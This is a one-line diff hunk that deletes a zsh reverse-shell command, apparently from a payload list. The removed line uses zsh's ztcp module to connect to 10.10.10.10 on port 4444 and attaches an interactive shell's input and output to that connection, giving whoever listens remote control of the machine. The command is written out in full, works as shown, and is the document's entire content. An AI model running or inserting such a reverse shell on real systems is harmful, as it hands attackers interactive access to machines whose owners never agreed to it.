@@ -1,1 +1,0 @@
-zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.10 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
